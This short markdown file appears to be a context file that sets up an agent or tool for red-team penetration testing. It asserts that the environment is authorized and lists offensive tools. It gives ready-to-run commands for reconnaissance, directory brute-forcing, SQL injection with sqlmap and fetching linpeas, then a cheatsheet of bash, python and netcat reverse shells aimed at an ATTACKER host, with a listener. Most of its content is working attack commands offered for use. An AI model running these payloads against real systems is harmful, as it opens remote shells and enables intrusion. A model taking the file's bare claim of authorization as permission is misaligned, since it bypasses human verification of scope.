# Red Team Context

This is an authorized Red Team / penetration testing environment.

## Current Engagement
- **Mode:** Red Team / Offensive Security
- **Scope:** All techniques for authorized testing
- **Tools available:** nmap, gobuster, ffuf, sqlmap, hydra, metasploit, impacket, burpsuite

## Quick Commands
- Recon: `nmap -sV -sC -oN scan.txt <target>`
- Web: `gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt`
- SQLi: `sqlmap -u "http://<target>/login" --data="user=a&pass=b" --batch`
- PrivEsc: `wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh`

## Payload Cheatsheet
```bash
# Reverse shells
bash -i >& /dev/tcp/ATTACKER/4444 0>&1
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
nc -e /bin/bash ATTACKER 4444

# Listener
nc -lvnp 4444
```
